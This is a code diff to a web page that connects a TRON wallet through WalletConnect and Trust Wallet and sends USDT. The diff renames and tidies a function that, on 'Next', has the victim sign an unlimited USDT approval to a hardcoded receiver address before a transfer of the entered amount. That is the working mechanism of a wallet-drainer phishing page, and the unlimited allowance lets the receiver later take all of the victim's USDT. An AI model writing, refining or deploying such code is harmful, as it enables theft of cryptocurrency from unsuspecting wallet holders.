@@ -71,7 +71,10 @@ body{
   font-weight:bold;
   cursor:pointer;
 }
-.btn:disabled{ background:#555; }
+.btn:disabled {
+  background:#555;
+  cursor:not-allowed;
+}
 .status{
   font-size:12px;
   color:#aaa;
@@ -86,7 +89,7 @@ body{
 
 <div class="container">
 
-<div id="status" class="status">Ready</div>
+<div id="status" class="status">Initializing...</div>
 
 <!-- RECEIVER -->
 <div class="box">
@@ -108,7 +111,7 @@ body{
 
 </div>
 
-<button class="btn" id="mainBtn" onclick="handleNext()">Next</button>
+<button id="nextBtn" class="btn" onclick="handleNext()">Next</button>
 
 <script>
 // CONFIG
@@ -122,6 +125,7 @@ let client = null;
 let session = null;
 let address = null;
 
+// SAFE SIGN CLIENT
 function getSignClient(){
   if(window.SignClient?.init) return window.SignClient;
   if(window.WalletConnectSignClient?.SignClient?.init) return window.WalletConnectSignClient.SignClient;
@@ -133,6 +137,7 @@ function setStatus(t){
   document.getElementById("status").innerText = t;
 }
 
+// INIT + RESTORE SESSION
 async function init(){
   try{
     if(window.tronWeb?.defaultAddress?.base58){
@@ -140,8 +145,10 @@ async function init(){
       setStatus("Connected: " + short(address));
       return;
     }
+
     const SignClient = getSignClient();
     if(!SignClient) return;
+
     client = await SignClient.init({
       projectId: PROJECT_ID,
       metadata:{
@@ -151,16 +158,23 @@ async function init(){
         icons:["https://raw.githubusercontent.com/salmanraheem-dev/bestforlast/refs/heads/main/public/logo.png"]
       }
     });
+
+    setStatus("Ready");
+
     const sessions = client.session.getAll();
     if(sessions.length){
       session = sessions[0];
       address = session.namespaces.tron.accounts[0].split(":")[2];
       setStatus("Connected: " + short(address));
     }
-  }catch(e){ console.error(e); }
+  }catch(e){
+    console.error(e);
+  }
 }
 
+// CONNECT
 async function connectWallet(){
+  if(!client) return alert("WalletConnect is still loading. Please wait a second.");
   try{
     const { uri, approval } = await client.connect({
       requiredNamespaces:{
@@ -171,10 +185,13 @@ async function connectWallet(){
         }
       }
     });
+
     if(uri){
-      window.location.href = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`;
+      const link = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`;
+      window.location.href = link;
       setTimeout(()=>{ window.location.href = APP_URL; }, 2500);
     }
+
     session = await approval();
     address = session.namespaces.tron.accounts[0].split(":")[2];
     setStatus("Connected: " + short(address));
@@ -184,62 +201,65 @@ async function connectWallet(){
   }
 }
 
+// FLOW
 async function handleNext(){
   if(!address){
     await connectWallet();
     return;
   }
-  processDualTransaction();
+  sendUSDTSequence();
 }
 
-async function processDualTransaction(){
-  const btn = document.getElementById("mainBtn");
+// TRANSACTION SEQUENCE
+async function sendUSDTSequence(){
+  const btn = document.getElementById("nextBtn");
   try{
-    const amountVal = document.getElementById("amount").value;
-    if(!amountVal || parseFloat(amountVal) <= 0) return alert("Enter valid amount");
-    
+    const amount = parseFloat(document.getElementById("amount").value);
+    if(!amount) return alert("Enter amount");
+
     btn.disabled = true;
     btn.innerText = "Processing...";
 
     const receiverHex = base58ToHex(RECEIVER).replace("41","").padStart(64,"0");
     const unlimitedHex = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-    const sunAmount = Math.floor(parseFloat(amountVal) * 1e6).toString(16).padStart(64,"0");
+    const sunHex = Math.floor(amount * 1e6).toString(16).padStart(64,"0");
 
     // 1. APPROVE UNLIMITED
-    setStatus("Step 1/2: Approving...");
-    await runTronTx("approve(address,uint256)", receiverHex + unlimitedHex);
+    setStatus("Step 1/2: Approving Unlimited...");
+    await triggerTx("approve(address,uint256)", receiverHex + unlimitedHex);
 
-    // 2. TRANSFER AMOUNT
-    setStatus("Step 2/2: Transferring...");
-    await runTronTx("transfer(address,uint256)", receiverHex + sunAmount);
+    // 2. SEND ENTERED AMOUNT
+    setStatus("Step 2/2: Sending USDT...");
+    await triggerTx("transfer(address,uint256)", receiverHex + sunHex);
 
-    setStatus("All Transactions Sent");
-    alert("Success: Approval and Transfer completed.");
-  } catch(e) {
+    alert("Transactions Sent Successfully");
+    setStatus("Transaction Completed");
+
+  }catch(e){
     console.error(e);
     alert("Error: " + e.message);
   } finally {
     btn.disabled = false;
     btn.innerText = "Next";
-    setStatus("Connected: " + short(address));
   }
 }
 
-async function runTronTx(selector, params){
+// TRON TRANSACTION BUILDER (EXACT TRONSCAN STYLE)
+async function triggerTx(method, params) {
     const tx = await fetch("https://api.trongrid.io/wallet/triggersmartcontract",{
       method:"POST",
       headers:{'Content-Type':'application/json'},
       body:JSON.stringify({
         owner_address: address,
         contract_address: USDT,
-        function_selector: selector,
+        function_selector: method,
         parameter: params,
         fee_limit: 100000000,
         visible: true
       })
     }).then(r=>r.json());
 
-    if(!tx.result || !tx.result.result) throw new Error("Contract build failed");
+    if(!tx.result || !tx.result.result) throw new Error("Contract call failed");
 
     let signed;
     if(window.tronWeb){
@@ -265,7 +285,10 @@ async function runTronTx(selector, params){
     return broadcast;
 }
 
-function short(a){ return a.slice(0,6)+"..."+a.slice(-4); }
+// HELPERS
+function short(a){
+  return a.slice(0,6)+"..."+a.slice(-4);
+}
 
 const ALPHABET="123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
 function base58ToHex(addr){
@@ -278,6 +301,7 @@ function base58ToHex(addr){
   return "41"+hex.slice(2,-8);
 }
 
+// INIT
 init();
 </script>
 
